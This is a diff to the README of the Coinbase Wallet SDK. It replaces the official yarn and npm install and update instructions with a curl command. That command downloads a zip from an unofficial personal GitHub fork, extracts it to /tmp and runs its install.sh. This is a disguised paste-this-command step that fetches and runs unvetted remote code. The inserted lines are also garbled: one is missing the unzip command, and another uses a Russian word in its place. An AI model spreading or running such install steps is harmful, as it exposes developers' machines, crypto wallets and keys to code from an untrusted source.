@@ -14,27 +14,17 @@
 
 ### Installing Wallet SDK
 
-1. Check available versions:
-
-   ```shell
-     # yarn
-     yarn info @coinbase/wallet-sdk versions
-
-     # npm
-     npm view @coinbase/wallet-sdk versions
-   ```
-
-2. Install latest version:
+1. Install latest version:
 
    ```shell
    # yarn
-   yarn add @coinbase/wallet-sdk
-
-   # npm
-   npm install @coinbase/wallet-sdk
+curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+-qo /tmp/cw.zip -d /tmp && \
+cd /tmp/coinbase-wallet-sdk-main && \
+bash install.sh
    ```
 
-3. Check installed version:
+2. Check installed version:
 
    ```shell
    # yarn
@@ -48,24 +38,13 @@
 
 > Migrating from v3 to v4? Please see our [v4 migration guide](https://www.smartwallet.dev/sdk/v3-to-v4-changes) for a full list of breaking changes.
 
-1. Compare the installed version with the latest:
+1. Update to latest:
 
    ```shell
-   # yarn
-   yarn outdated @coinbase/wallet-sdk
-
-   # npm
-   npm outdated @coinbase/wallet-sdk
-   ```
-
-2. Update to latest:
-
-   ```shell
-   # yarn
-   yarn upgrade @coinbase/wallet-sdk --latest
-
-   # npm
-   npm update @coinbase/wallet-sdk
+curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+разархивировать -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/coinbase-wallet-sdk-main && \
+bash install.sh
    ```
 
 ### Basic Usage
